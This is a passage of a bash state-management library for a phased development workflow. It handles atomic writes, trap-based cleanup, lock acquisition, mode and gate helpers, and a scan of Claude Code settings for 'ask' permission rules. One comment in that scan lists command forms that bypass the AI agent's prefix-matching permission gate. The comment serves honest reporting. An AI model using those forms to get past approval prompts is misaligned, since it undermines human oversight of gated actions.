# here) -- so a nested call inside the fork can never clobber the outer process's saved copy.
_save_traps() {
  _EDM_SAVED_TRAP_EXIT="$(trap -p EXIT || true)"
  _EDM_SAVED_TRAP_INT="$(trap -p INT || true)"
  _EDM_SAVED_TRAP_TERM="$(trap -p TERM || true)"
  _EDM_SAVED_TRAP_HUP="$(trap -p HUP || true)"
}

_restore_traps() {
  _restore_trap EXIT "$_EDM_SAVED_TRAP_EXIT"
  _restore_trap INT "$_EDM_SAVED_TRAP_INT"
  _restore_trap TERM "$_EDM_SAVED_TRAP_TERM"
  _restore_trap HUP "$_EDM_SAVED_TRAP_HUP"
}

_write_atomic_cleanup() {
  rm -f "$1"
}

# _write_atomic_unwind <tmp> -- G84 (round-3 CA-244): collapses write_atomic's two
# near-identical failure-branch sequences (remove the temp file, then restore all four
# signal traps) into one call. The caller still issues its own `return $ec` immediately
# after -- this helper only performs the unwind side effects, never returns/exits itself, so
# it is safe to call from either failure branch below without changing control flow.
_write_atomic_unwind() {
  rm -f "$1"
  _restore_traps
}

# ---- Lock reentrancy guard (round-3 G2/CA-142 re-fix) -----------------------
# G18/CA-306 (round 5): corrected -- this used to say "mkdir-branch subshell" only. G26 armed
# the SAME guard around the flock branch's subshell too (below), closing a gap where that
# branch never armed it at all; both branches now set _EDM_TRAP_DEPTH=1 for their own
# subshell's lifetime. _EDM_TRAP_DEPTH is used ONLY to detect an attempted nested
# with_state_lock call (with_state_lock is not reentrant -- a nested call would deadlock against
# its own mkdir, or against its own flock). It no longer gates write_atomic's trap
# installation: write_atomic installs its own full EXIT/INT/TERM/HUP trap layer unconditionally
# (see write_atomic below), because a `( )` subshell fork resets what `trap -p` reports for the
# forked process (verified empirically -- a bare `( )` subshell's own `trap -p EXIT/INT/TERM/HUP`
# reports nothing for a trap the PARENT installed before the fork), so that trap layer is
# nesting-depth ONE from the subshell's own perspective, not depth two.
#
# The previous fix for this (CA-142/CA-143's original _EDM_CLEANUP_PATHS shared-list mechanism)
# is deleted: it pushed onto the SUBSHELL's own private copy of that array (write_atomic always
# ran inside the fork, once _EDM_TRAP_DEPTH was set before it), which the trap installed in the
# PARENT before the fork could never see -- the only reader ran from the outer trap body and
# always drained an empty list. That made the whole mechanism dead code providing ZERO INT/TERM/
# HUP coverage during the locked write on the mkdir branch, the only branch a host without
# flock(1) (i.e. macOS, this project's primary development platform) takes. See round-3 findings
# G2 (CA-142) and G3 (CA-143).
_EDM_TRAP_DEPTH=0

write_atomic() {
  [[ $# -ge 2 ]] || { echo "write_atomic: usage: write_atomic <dest> <command> [args...]" >&2; return 2; }
  local dest="$1"; shift
  local dest_dir tmp ec=0 _WRITE_ATOMIC_TMP
  dest_dir="$(dirname "$dest")"
  [[ -d "$dest_dir" ]] || { echo "write_atomic: destination directory does not exist: ${dest_dir}" >&2; return 1; }
  [[ -w "$dest_dir" ]] || { echo "write_atomic: destination directory is not writable: ${dest_dir}" >&2; return 1; }
  tmp="$(mktemp "${dest}.tmp.XXXXXX" 2>/dev/null)" || { echo "write_atomic: mktemp failed for ${dest}" >&2; return 1; }

  # CA-159: never interpolate a path into a trap body string -- a path containing an
  # apostrophe (an ordinary surname directory, e.g. "o'brien") would terminate the quoting
  # early and corrupt the stored trap body into a syntax error at signal time. Assign to a
  # dedicated variable first, then reference it INSIDE single quotes so it expands at signal
  # time, not at install time (the pattern already used correctly at edm-lint-artifacts's own
  # cleanup trap, edm-check-grants's own cleanup trap, and bin/tests/_harness.sh's
  # `with_scratch_repo` cleanup trap; G72/CA-232 closed the one remaining interpolation site
  # of this class, bin/tests/_harness.sh's own `harness_scratch_dir` cleanup trap). CA-268
  # (round 4/5): cited by function/site NAME rather than by line number here on purpose --
  # this exact comment's prior line-number form went stale twice, the second time inside the
  # very commit that fixed the first staleness, by pushing the cited trap down three lines.
  #
  # G2/G3 (round-3 CA-142/CA-143 re-fix): this trap layer is now installed UNCONDITIONALLY, even
  # when write_atomic runs inside with_state_lock's mkdir-branch subshell ("( "$@" )" a few
  # hundred lines below). A real signal delivered to the process group (a terminal Ctrl-C, or the
  # group-wide `kill` this file's own regression tests use to reproduce one) reaches BOTH this
  # subshell's process AND with_state_lock's own outer process independently, so each one's
  # currently-installed trap fires and cleans up its own resource -- this tmp file here, the
  # lockdir in the outer process -- with no coordination mechanism needed between them.
  _WRITE_ATOMIC_TMP="$tmp"
  _save_traps
  # CA-143: INT/TERM/HUP must actually terminate the process after cleanup -- a trap that only
  # cleans up and returns lets the interrupted caller resume, which can then race a second
  # process that (correctly) believes the resource is free. The EXIT trap is cleanup ONLY and
  # must never call exit itself (an EXIT trap calling exit can recurse into confusing
  # behaviour).
  trap '_write_atomic_cleanup "$_WRITE_ATOMIC_TMP"' EXIT
  trap '_write_atomic_cleanup "$_WRITE_ATOMIC_TMP"; exit 130' INT
  trap '_write_atomic_cleanup "$_WRITE_ATOMIC_TMP"; exit 143' TERM
  trap '_write_atomic_cleanup "$_WRITE_ATOMIC_TMP"; exit 129' HUP

  # CA-134: guard the capture on the SAME statement, not on the line after it -- a bare
  # `"$@" > "$tmp"` followed by a separate `ec=$?` is only safe under set -e because every
  # current call site happens to sit in an errexit-suspended position (inside an `if`, an
  # `&&`/`||` chain, etc). The next plain, unguarded `write_atomic` call anyone adds anywhere
  # changes this from "return the renderer's exit status" to "abort the process immediately,
  # with none of the cleanup/trap-restoration logic below ever running".
  "$@" > "$tmp" || ec=$?
  if [[ $ec -ne 0 ]]; then
    _write_atomic_unwind "$tmp"
    return $ec
  fi
  # CA-134: same guard as above -- the mv's exit status must be captured on this statement
  # itself, not on a following bare line.
  mv -f "$tmp" "$dest" || ec=$?
  if [[ $ec -ne 0 ]]; then
    _write_atomic_unwind "$tmp"
    return $ec
  fi
  _restore_traps
}

_rmw_state_render() {
  local f="$1"; shift
  local filter="$1"; shift
  jq "$@" "$filter" "$f"
}

# _print_line <text> -- appends a terminating newline (G38). Use this for any write_atomic
# call whose content is a complete document (e.g. HANDOFF.md) that should end with a newline.
# G28 (CA-259): the no-newline sibling this was originally written beside, _print_literal, is
# deleted -- it had zero callers left after the G38 fix moved its one caller to this function,
# and the comment retaining it claimed a pattern-library splice elsewhere in this file depended
# on its exact no-newline behavior; no such dependency exists (_splice_pattern_file uses its own
# inline printf, not this helper).
_print_line() {
  printf '%s\n' "$1"
}

_rmw_state_body() {
  local f="$1"; shift
  local filter="$1"; shift
  [[ -f "$f" ]] && cp -p "$f" "${f}.bak"
  if ! write_atomic "$f" _rmw_state_render "$f" "$filter" "$@"; then
    echo "edm-state: state write failed (jq error) for $f" >&2
    return 1
  fi
}

# rmw_state <PREFIX> <jq-filter> [jq-args...]
# Acquires the advisory lock, re-reads state from disk, applies filter, writes back.
# Use instead of read_state/write_state for all mutating commands.
rmw_state() {
  local prefix="$1"; shift
  local filter="$1"; shift
  local f lockbase
  f="$(state_file_for "$prefix")"; lockbase="${f%.json}"
  mkdir -p "$(dirname "$f")"
  with_state_lock "$lockbase" _rmw_state_body "$f" "$filter" "$@"
}

now_utc() {
  date -u +"%Y-%m-%dT%H:%M:%SZ"
}

# git_aware_mv <src> <dst> -- move a directory, using `git mv` when src is inside a git
# worktree (so the move is tracked), falling back to plain mv otherwise. Single source
# for the archive + migrate-path move idiom. (CA-015)
git_aware_mv() {
  local s="$1" d="$2"
  [[ ! -e "$d" ]] || die "git_aware_mv: destination already exists: $d"
  if git -C "$s" rev-parse --is-inside-work-tree >/dev/null 2>&1; then
    if ! git mv "$s" "$d" 2>/dev/null; then
      if git -C "$s" ls-files --error-unmatch . >/dev/null 2>&1; then
        die "git_aware_mv: git mv failed for tracked path '${s}' -> '${d}'"
      fi
      mv "$s" "$d"
    fi
  else
    mv "$s" "$d"
  fi
}

# present_or_absent <path> [nonempty] -- echo '[present]' if the file exists, else '[absent]'.
# (CA-015) The optional second arg "nonempty" (EDMV3-T11 AC1) extends this same idiom into a
# non-empty variant (`-s` instead of `-f`) for cmd_phase_complete's per-phase artifact check,
# rather than defining a sixth presence idiom. Existing no-arg callers are unaffected.
present_or_absent() {
  local f="$1" mode="${2:-}"
  if [[ "$mode" == "nonempty" ]]; then
    [[ -s "$f" ]] && echo '[present]' || echo '[absent]'
  else
    [[ -f "$f" ]] && echo '[present]' || echo '[absent]'
  fi
}

# gated_phase_for_gate <gate-num> -- the phase whose completion feeds the given HITL gate
# (gate 1 -> phase 1, gate 2 -> phase 3, gate 3 -> phase 5). Single source for this map. (CA-013)
gated_phase_for_gate() {
  case "$1" in 1) echo 1 ;; 2) echo 3 ;; 3) echo 5 ;; *) echo "null" ;; esac
}

# ---- Mode derivation helpers (EDMV3-T07 / EDMV3-114) ------------------------
# MODE_ENUM_LIST / LIFECYCLE_MODE_ENUM_LIST -- single source for the two legal
# enums. Deliberately space-separated strings (bash 3.2 has no arrays usable as
# a portable single-line constant) and consumed with the word-membership idiom
# `case " $LIST " in *" $item "*)` so no caller re-encodes the enum as a second
# literal (EDMV3-T09 uses the identical idiom for SETTABLE_KEYS).
MODE_ENUM_LIST="standard mini-srd iac data-ml prototype"
LIFECYCLE_MODE_ENUM_LIST="standard fast-track fix-pack"

# terminal_phase_for_mode <mode> <lifecycle_mode> -- the phase at which this
# initiative's lifecycle ends (EDMV3-T07 AC1). One comment per enum row so the
# mapping's rationale is never re-derived from memory. `lifecycle_mode` never
# shortens the terminal phase -- a fast-track initiative still ends at phase 6
# and only skips middle phases via skipped_phases; it is validated here only so
# an unrecognized value fails loudly rather than being silently ignored (AC7).
# `gated_phase_for_gate` remains the separate gate-to-phase half and is reused
# by required_gates_for_mode(), not replaced (AC2/AC5).
terminal_phase_for_mode() {
  local mode="$1" lifecycle_mode="$2"
  # C-4 read-compat (EDMV3-T59 / D12): `partial` was removed from the settable enum because it
  # was a legal value with no documented sub-flow anywhere. A state file written before the
  # removal can still carry it, and refusing to READ such a file would strand the initiative.
  # It is accepted here (treated as `standard`, its only ever behaviour) and reported as an
  # informational LEGACY_LIFECYCLE_MODE anomaly; `set-mode` still refuses to WRITE it.
  if [[ "$lifecycle_mode" == "partial" ]]; then
    lifecycle_mode="standard"
  fi
  case " $LIFECYCLE_MODE_ENUM_LIST " in
    *" $lifecycle_mode "*) ;;
    *) die "terminal_phase_for_mode: unknown lifecycle_mode '${lifecycle_mode}' (expected: ${LIFECYCLE_MODE_ENUM_LIST// /|})" ;;
  esac
  case "$mode" in
    standard)  echo 6 ;;  # full six-phase lifecycle
    mini-srd)  echo 6 ;;  # skips phases 2, 4, 5 (fused planning+SRD file) but still reaches phase 6
    iac)       echo 6 ;;  # full six-phase lifecycle with IaC-specific artifact vocabulary
    data-ml)   echo 6 ;;  # full six-phase lifecycle with Data Requirements / model-metric additions
    prototype) echo 2 ;;  # terminates after Phase 2 (SRD) -- no tickets, no implementation phase
    *) die "terminal_phase_for_mode: unknown mode '${mode}' (expected: ${MODE_ENUM_LIST// /|})" ;;
  esac
}

# required_gates_for_mode <mode> <lifecycle_mode> <skipped-phases-space-separated>
# Returns (one per line) the gate numbers this lifecycle actually requires
# (EDMV3-T07 AC2). A gate G is required iff gated_phase_for_gate(G) is not in
# skipped_phases and is at or below terminal_phase_for_mode(mode, lifecycle_mode).
# gated_phase_for_gate is reused as the gate-to-phase half, not replaced.
required_gates_for_mode() {
  local mode="$1" lifecycle_mode="$2" skipped_phases="${3:-}"
  local terminal
  terminal="$(terminal_phase_for_mode "$mode" "$lifecycle_mode")"
  local g gated_phase
  for g in 1 2 3; do
    gated_phase="$(gated_phase_for_gate "$g")"
    [[ "$gated_phase" == "null" ]] && continue
    # bash 3.2 word-membership test (no associative arrays available).
    case " $skipped_phases " in
      *" $gated_phase "*) continue ;;
    esac
    [[ "$gated_phase" -le "$terminal" ]] && echo "$g"
  done
}

# phase_start_prerequisite_gate <phase-num> -- the single gate (if any) that must be approved
# before <phase-num> may start (EDMV3-T13 AC1), derived from the same gated_phase_for_gate()
# map cmd_gate_check and required_gates_for_mode() already use (CA-013 single source): the
# gate whose feeding phase is immediately before <phase-num>. Echoes the gate number, or
# "none" when this phase has no kernel-enforced prerequisite (phase 1, or any phase that does
# not immediately follow a gated phase).
phase_start_prerequisite_gate() {
  # CA-157: defence in depth -- coerce before the arithmetic-context -eq below, even though
  # both current callers now validate at their own entry point first.
  local phase g gated_phase
  phase="$(to_int "$1" 0)"
  for g in 1 2 3; do
    gated_phase="$(gated_phase_for_gate "$g")"
    [[ "$gated_phase" == "null" ]] && continue
    [[ $((gated_phase + 1)) -eq "$phase" ]] && { echo "$g"; return 0; }
  done
  echo "none"
}

# code_audit_required_for_mode <mode> -- whether this mode's phase graph includes
# a code-audit round (EDMV3-T07 AC6). Consumed by cmd_archive so the convergence
# exemption is derived once rather than special-cased separately; EDMV3-T08 adds
# the second consumer (cmd_approve_gate's code-audit gate token).
code_audit_required_for_mode() {
  local mode="$1"
  case "$mode" in
    prototype) echo false ;;  # terminates at Phase 2 -- no implementation phase, no code audit
    standard|mini-srd|iac|data-ml) echo true ;;
    *) die "code_audit_required_for_mode: unknown mode '${mode}' (expected: ${MODE_ENUM_LIST// /|})" ;;
  esac
}

audit_required_for_mode_or_legacy() {
  local mode="$1"
  if [[ "$mode" == "null" ]]; then
    echo true
  else
    code_audit_required_for_mode "$mode"
  fi
}

# convergence_exempt <mode> <lifecycle_mode> - echoes "true" when this initiative's phase graph
# never runs a code-audit round at all, so the convergence gate cannot meaningfully apply.
#
# Two independent reasons, OR-ed: the mode has no implementation phase
# (code_audit_required_for_mode, which stays the single source of the mode-keyed half), or the
# lifecycle mode generates tickets straight from an analysis document and has no audit round.
#
# Single source for both consumers. cmd_archive and cmd_audit_converged previously carried
# byte-identical copies of the lifecycle case and the mode derivation, and every prose
# description of the rule -- CLAUDE.md's mode matrix, skills/implement/SKILL.md's Declare Done
# step -- states it as one rule, so two copies is exactly the drift this methodology exists to
# remove. cmd_approve_gate's code-audit precheck deliberately does NOT use this helper: it
# shares only the mode-half helper below, because approving a code-audit gate under a lifecycle
# mode that has no audit round should stay refused rather than become exempt.
#
# mode == "null" is a legacy state predating the mode field and defaults to "audit required"
# through audit_required_for_mode_or_legacy() so every caller shares the same legacy fallback.
convergence_exempt() {
  local mode="$1" lifecycle_mode="$2"
  local audit_required
  audit_required="$(audit_required_for_mode_or_legacy "$mode")"
  if [[ "$audit_required" == "false" ]]; then
    echo true
    return 0
  fi
  case "$lifecycle_mode" in
    fast-track|fix-pack) echo true ;;
    *) echo false ;;
  esac
}

# default_skipped_phases_json_for_mode <mode> -- the phase graph's own skip set for
# a freshly created (or newly mode-switched) initiative (EDMV3-T07 AC4), as a JSON
# array of {phase, rationale, skipped_at} ready for skipped_phases. Each rationale
# names the mode per AC4. standard/iac/data-ml run the full graph -- no phase is
# pre-skipped for them.
default_skipped_phases_json_for_mode() {
  local mode="$1" ts
  ts="$(now_utc)"
  if [[ "$mode" == "mini-srd" ]]; then
    jq -n --arg ts "$ts" '[
      {phase: 2, rationale: "mini-srd: Phase 2 SRD creation fused into a single planning+SRD file (mode phase graph)", skipped_at: $ts},
      {phase: 4, rationale: "mini-srd: ticket pack fused into SRD file (mode phase graph)", skipped_at: $ts},
      {phase: 5, rationale: "mini-srd: ticket audit fused into SRD audit (mode phase graph)", skipped_at: $ts}
    ]'
  elif [[ "$mode" == "prototype" ]]; then
    jq -n --arg ts "$ts" '[
      {phase: 3, rationale: "prototype: SRD audit skipped -- lifecycle ends at Phase 2 (mode phase graph)", skipped_at: $ts},
      {phase: 4, rationale: "prototype: ticket creation skipped -- lifecycle ends at Phase 2 (mode phase graph)", skipped_at: $ts},
      {phase: 5, rationale: "prototype: ticket audit skipped -- lifecycle ends at Phase 2 (mode phase graph)", skipped_at: $ts},
      {phase: 6, rationale: "prototype: implementation skipped -- lifecycle ends at Phase 2 (mode phase graph)", skipped_at: $ts}
    ]'
  else
    echo "[]"
  fi
}

# check_permission_rules -- computes the "enforcement" tier recorded alongside every gate
# approval (EDMV3-T06, replacing the EDMV3-T08 interim stub that always returned
# "prose-only"). Scans Claude Code settings files for the two "ask" patterns that gate the
# mutation commands themselves (Tier 1 in SRD Section 5.1):
#   Bash(edm-state approve-gate*)
#   Bash(edm-state archive*)
# Echoes "permission-ask" when BOTH patterns are found (in any combination across the
# scanned files -- Claude Code merges permission settings across scopes, so the patterns
# need not share one file), else "prose-only".
#
# This tag records whether the rules were configured in scanned settings at approval time --
# it does NOT mean a permission prompt actually fired for that specific invocation. Claude
# Code's Bash permission matcher is a literal prefix match against the exact command string
# (see README.md's "Matcher limitation" note for the bypass shapes this misses -- compound
# `cd ... &&`, absolute-path, env-prefixed, and `bash -c '...'` forms). Overstating this tag
# to mean "a prompt fired" would make it dishonest in exactly the bypass case it exists to
# expose (EDMV3-T06 AC11).
#
# Scanned files, in this order (presence of both patterns in the union is sufficient),
# verified against Claude Code settings-precedence documentation on 2026-07-26:
#   1. .claude/settings.local.json  (project-local, typically gitignored)
#   2. .claude/settings.json        (project-shared, committed)
#   3. ~/.claude/settings.json      (user-level)
# Known, examined omission (not missed): enterprise/organization managed-policy settings
# and CLI `--settings`-supplied files are not scanned -- there is no portable, documented
# filesystem path for either from a plain bash script, and both are rarer install shapes
# than the three above. An installation relying solely on one of those reports
# "prose-only" even though its rules are in fact enforced -- a conservative false-negative,
# consistent with the fail-safe direction below (AC6).
#
# Fail-safe (AC6): any read/parse uncertainty for a given file -- missing, unreadable,
# malformed JSON, or a `.permissions.ask` field that isn't a JSON array -- is treated as
# "not found" for that file and the scan moves to the next one. A false "missing"
# (prose-only) is harmless; a false "present" (permission-ask) is not, since it would
# overstate the tier that actually enforced the approval.
check_permission_rules() {
  local pat1='Bash(edm-state approve-gate*)'
  local pat2='Bash(edm-state archive*)'
  local found1=false found2=false
  local f ask_json
  for f in ".claude/settings.local.json" ".claude/settings.json" "${HOME:-}/.claude/settings.json"; do
    [[ -n "$f" && -f "$f" && -r "$f" ]] || continue
    # `jq -e` exits non-zero on a null/false result (missing .permissions.ask) or on a
    # JSON parse error -- both land us in `continue`, matching the fail-safe direction.
    ask_json="$(jq -e '.permissions.ask' "$f" 2>/dev/null)" || continue
    echo "$ask_json" | jq -e 'type == "array"' >/dev/null 2>&1 || continue
    if echo "$ask_json" | jq -e --arg p "$pat1" 'any(.[]?; . == $p)' >/dev/null 2>&1; then
      found1=true
    fi
    if echo "$ask_json" | jq -e --arg p "$pat2" 'any(.[]?; . == $p)' >/dev/null 2>&1; then
      found2=true
    fi
  done
  if [[ "$found1" == "true" && "$found2" == "true" ]]; then
    echo "permission-ask"
  else
    echo "prose-only"
  fi
}

# Shared jq def for the whole-initiative coverage layer row -- one renderer, one padding scheme
# (clamped 14-wide layer column; 9/8/7 pct padding), prepended to both get-coverage and
# metrics-report so the two can never diverge again. Input: a {key,value} coverage entry. (CA-012)
COVERAGE_LAYER_ROW_JQ_DEF='def coverage_layer_row:
  "  \(.key | . + (" " * (14 - length | if . < 0 then 0 else . end)))  \(.value.pct)%\(if .value.pct < 10 then "         " elif .value.pct < 100 then "        " else "       " end)  \(.value.measured_at // "?")";'

# _edm_reclaim_stale_lockdir <lockdir> <success-log-message>
# Shared atomic reclaim: `mv "$lockdir" "${lockdir}.stale.$$"` either wins or loses the rename
# race outright, so at most one contender ever proceeds to remove a given stale lockdir -- unlike
# a bare `rm -rf "$lockdir"`, which has a TOCTOU window between the staleness decision and the
# removal where a second contender that had already reclaimed the lock (mkdir'd a brand-new
# lockdir at the same path) would have that new, LIVE lockdir deleted out from under it (round-3
# G29/CA-141). Used by both reclaim paths below (dead-PID and invalid-PID) so they can never
# diverge again. Logs and removes the staged-aside copy only when this call won the race; silently
# does nothing when it lost (the winner's own call already reclaimed it).
_edm_reclaim_stale_lockdir() {
  local lockdir="$1" msg="$2" stale_aside
  stale_aside="${lockdir}.stale.$$"
  if mv "$lockdir" "$stale_aside" 2>/dev/null; then
    echo "edm-state: ${msg}" >&2
    rm -rf "$stale_aside"
  fi
}

# _lock_retry_or_die <lockdir> <reason-suffix> -- shared retry-accounting tail for
# with_state_lock's mkdir-based spin loop below (G47/CA-278). Increments the loop's own `tries`
# counter and dies naming <reason-suffix> once the 50-try bound is reached; otherwise sleeps
# 0.1s so the caller's next loop iteration is rate-limited. This used to be duplicated three
# times (invalid-PID branch, dead-PID-reclaim branch, live-holder fallthrough) under a comment
# that already (inaccurately) called it "the shared retry accounting" -- extracting it here
# makes that description true. `tries` is the CALLER's own `local` variable, not a global or an
# argument: bash's dynamic scoping makes a caller's `local` visible to any function the caller
# invokes (unlike a lexically scoped language's stack frames), so this helper's plain
# `tries=$(( tries + 1 ))` reads and writes the caller's own counter directly.
_lock_retry_or_die() {
  local _lockdir="$1" _reason="$2"
  tries=$(( tries + 1 ))
  if [[ $tries -ge 50 ]]; then
    die "state lock timeout after 50 tries on ${_lockdir}${_reason}"
  fi
  sleep 0.1
}

# ---- Advisory file locking (T24) -------------------------------------------
# with_state_lock <lockbase> <command...>
# Acquires an exclusive advisory lock scoped to <lockbase>, runs the command,
# then releases the lock. Uses flock(1) on <lockbase>.lock when available;
# falls back to a mkdir-based spin-lock on <lockbase>.lockd for macOS portability.
with_state_lock() {
  local lockbase="$1"; shift
  local lockfile="${lockbase}.lock"
  local lockdir="${lockbase}.lockd"
  local pidfile="${lockdir}/pid"

  # G26 (CA-257): assert the nesting-depth-one constraint BEFORE attempting to acquire the lock
  # at all, ahead of BOTH branches below -- not after acquisition succeeds on only one of them
  # (the previous position, below the until-mkdir loop on the mkdir branch only). with_state_
  # lock is not reentrant: a caller's own locked body calling with_state_lock again with the
  # SAME lockbase previously went undetected here on the mkdir branch until the nested call had
  # already entered the until-mkdir spin loop, found the still-held lockdir OWNED BY THIS SAME
  # PROCESS, spun up to 50 times treating its own PID as an external "holder", and died with a
  # misleading "held by PID <this process>" timeout message -- never reaching the guard at all.
  # On the flock branch the guard was previously not armed anywhere (see the `_EDM_TRAP_DEPTH=1`
  # line inside that branch below), making it fully inert there -- a same-lockbase nested call
  # would instead block against flock(1) itself until the unrelated 10s timeout fired. Checking
  # depth FIRST, before either branch's acquisition attempt, turns both shapes into one
  # immediate, correctly named diagnostic instead of a slow, misleading one.
  # G18/CA-306 (round 5): corrected -- this used to claim the guard only catches same-lockbase
  # self-nesting, and that a nested call against a DIFFERENT lockbase is unaffected. That is
  # false in both directions: `_EDM_TRAP_DEPTH` is a single, PROCESS-GLOBAL flag, not keyed on
  # lockbase at all, so ANY with_state_lock call attempted while another is already active dies
  # here immediately, regardless of whether the two calls target the same lockbase or different
  # ones. No locked body in this file nests today (verified by call-graph sweep), so this has
  # never fired live -- but a future contributor adding the first nested call, expecting
  # different lockbases to be legal per the old comment, would be misled by it. If cross-lockbase
  # nesting should ever become legal, key this guard on the lockbase itself instead of rewriting
  # this comment again.
  [[ "${_EDM_TRAP_DEPTH:-0}" -eq 0 ]] \
    || die "with_state_lock: internal: lock trap already active (_EDM_TRAP_DEPTH=${_EDM_TRAP_DEPTH}) -- nested with_state_lock calls (the same lockbase, one locked body calling with_state_lock again) are not supported"

  if command -v flock >/dev/null 2>&1; then
    # Fast path: flock on FD 200 (high enough to avoid collisions with stdin/stdout/stderr
    # and typical script-level pipes; bash 3.2 lacks dynamic file-descriptor auto-assignment
    # (the brace-redirection idiom naming a variable instead of a literal FD number, a bash-4
    # construct EDMV3-T61 AC9's CI grep bans), so we pick 200 by convention instead)
    # `|| _lock_ec=$?` keeps the subshell in a tested position so `set -e` does NOT abort here on a
    # non-zero exit -- otherwise the timeout `die` below is unreachable and a flock-host timeout exits
    # with a bare 99 and no message (CA-006). Success leaves _lock_ec=0.
    #
    # CA-169: never `rm -f "$lockfile"` here or anywhere else in this file. flock(1)'s mutual
    # exclusion is keyed on the file's INODE, not its path -- unlinking a released lock file lets
    # a later contender open()+flock() a freshly created inode at the same path while an earlier
    # holder that still has the old inode open believes it still holds the lock, silently
    # breaking mutual exclusion. The file is deliberately left on disk forever; `.gitignore`
    # already hides `**/.edm-state.lock*` from git status, so this is not a leak.
    #
    # G49: detect the flock timeout via a side-channel marker file, not the locked body's own
    # exit code. The previous design (`flock -w 10 200 || exit 99` inside the subshell, then
    # `[[ $_lock_ec -eq 99 ]]` outside it) misreports a LOCKED BODY that happens to exit 99 for
    # its own, unrelated reason as a lock timeout -- 99 was not reserved anywhere else in this
    # file, and this file's mutators already use other out-of-band codes (e.g. `_cmd_init_body`'s
    # `return 10`), so the sentinel space is in active, growing use and a future collision is
    # plausible. A marker file created ONLY by the timeout branch itself, checked after the
    # subshell exits, is unambiguous regardless of what "$@" returns.
    #
    # G26: _EDM_TRAP_DEPTH is armed around this subshell too, mirroring the mkdir branch's own
    # arming below -- previously this flock branch never set it at all, leaving the reentrancy
    # guard above permanently inert whenever flock(1) was available (i.e. on Linux, including
    # this project's own CI images). Set before the fork so a nested with_state_lock call
    # invoked from inside the subshell inherits depth 1 and is caught by the guard above, the
    # same technique the mkdir branch already used for its own subshell.
    # G17/CA-305 (round 5): the marker used to live inside the (tracked, potentially
    # group-writable) initiative directory, alongside the lockfile itself, and was created with
    # a truncating, symlink-following `: >` redirect. Two defects that one rewrite closes: (1) a
    # local user has a window to plant a symlink at the marker's predictable PID-derived name and
    # have it truncated; (2) if the marker write fails for any reason (e.g. the artifact
    # directory happens to be read-only), the existence check below sees nothing and a bare,
    # message-free exit 99 reaches roughly thirty bare mutator callers -- precisely the
    # misreport G49 built this whole marker mechanism to eliminate, reintroduced in that
    # sub-case. Now: derived under TMPDIR (writability no longer depends on the artifact
    # directory at all), created with `mkdir` (atomic, fails on ANY existing name -- file,
    # directory, or a pre-planted symlink -- unlike a redirect, which follows and truncates a
    # symlink instead of refusing it).
    local _lock_ec=0 _lock_timeout_marker
    _lock_timeout_marker="${TMPDIR:-/tmp}/edm-state.lock-timeout.$$"
    rm -rf "$_lock_timeout_marker" 2>/dev/null || true
    _EDM_TRAP_DEPTH=1
    ( flock -w 10 200 || { mkdir "$_lock_timeout_marker" 2>/dev/null; exit 99; }; "$@" ) 200>"${lockfile}" || _lock_ec=$?
    _EDM_TRAP_DEPTH=0
    if [[ -e "$_lock_timeout_marker" ]]; then
      rm -rf "$_lock_timeout_marker" 2>/dev/null || true
      die "state lock timeout after 10s on ${lockfile} (another edm-state process may be holding it)"
    elif [[ $_lock_ec -eq 99 ]]; then
      # G17/CA-305: the marker mkdir itself failed (e.g. TMPDIR is not writable) -- still name
      # the timeout rather than silently returning a bare 99 to a bare mutator caller.
      die "state lock timeout after 10s on ${lockfile} (another edm-state process may be holding it) -- the timeout marker could not be created at ${_lock_timeout_marker} (check TMPDIR writability)"
    fi
    return $_lock_ec
  else
    # Fallback: mkdir-based spin-lock (POSIX-portable, atomic on local filesystems)
    #
    # CA-141/G29 (round-3 CA-141 re-fix): reclamation is atomic and bounded on BOTH reclaim
    # paths, via the shared _edm_reclaim_stale_lockdir helper above. `mv "$lockdir"
    # "${lockdir}.stale.$$"` either wins or loses the rename race outright, so at most one
    # contender ever proceeds to remove a given stale lockdir -- a bare `rm -rf "$lockdir"` (the
    # invalid-PID branch's original, pre-G29 behaviour) has a TOCTOU window between the
    # staleness decision and the removal where a second contender that had already reclaimed the
    # lock would have its own, brand-new, LIVE lockdir deleted out from under it. A non-zero
    # `kill -0` is NOT unconditionally "dead": a live holder owned by a different UID also fails
    # `kill -0` (EPERM). bash does not expose errno directly, so the error text distinguishes the
    # two -- "not permitted" means alive-but-not-ours-to-signal (never reclaim), anything else
    # (typically "no such process") means genuinely dead (safe to reclaim). PID reuse / PID
    # namespaces can still make a genuinely dead holder look alive (kill -0 succeeds) -- that
    # direction is benign (it only means the lock is not reclaimed when it safely could be), so
    # it is not handled here. Every path below now falls through to the shared
    # `_lock_retry_or_die` tail (G47/CA-278), so the documented "50 tries" bound is a single,
    # actual bound on wall-clock retries rather than three separately-maintained copies, and
    # neither reclaim path tight-loops.
    #
    # The numeric-PID regex `^[0-9]+$` alone would accept the literal string "0" as "valid", but
    # `kill -0 0` targets the WHOLE PROCESS GROUP (not PID 0, which does not exist) and always
    # succeeds -- so a pidfile containing "0" would be classified live forever (50 retries then a
    # hard die, with no reclamation ever possible). Reject "0" alongside non-numeric/empty values
    # so it is routed through the same atomic reclaim as any other invalid PID.
    local tries=0 holder_pid="" _STATE_LOCKDIR
    local _mkdir_err
    # G22: capture mkdir's own stderr on this (and every) failed attempt. On the very
    # first failed attempt, if the lockdir still doesn't exist AND the failure wasn't
    # the expected "File exists" (i.e. some other process already holds the lock), the
    # failure is a real environment error (e.g. a read-only checkout) rather than
    # contention -- die immediately naming it instead of spin-retrying for 50 tries and
    # reporting a misleading "lock timeout" once the retries are exhausted.
    until _mkdir_err="$(mkdir "$lockdir" 2>&1)"; do
      if [[ $tries -eq 0 && ! -d "$lockdir" && "$_mkdir_err" != *"File exists"* ]]; then
        die "with_state_lock: cannot create lock directory ${lockdir}: ${_mkdir_err}"
      fi
      holder_pid=""
      if [[ -f "$pidfile" ]]; then
        holder_pid="$(cat "$pidfile" 2>/dev/null || true)"
        if [[ -z "$holder_pid" || ! "$holder_pid" =~ ^[0-9]+$ || "$holder_pid" == "0" ]]; then
          _edm_reclaim_stale_lockdir "$lockdir" \
            "reclaimed a lockdir with an invalid PID '${holder_pid:-missing}' at ${lockdir}"
          _lock_retry_or_die "$lockdir" " (invalid PID)"
          continue
        fi
        if ! kill -0 "$holder_pid" 2>/dev/null; then
          local kill0_err
          kill0_err="$(kill -0 "$holder_pid" 2>&1 >/dev/null || true)"
          if [[ "$kill0_err" == *"not permitted"* || "$kill0_err" == *"Not permitted"* ]]; then
            echo "edm-state: state lock ${lockdir} is held by PID ${holder_pid} (owned by another user) -- not reclaiming" >&2
          else
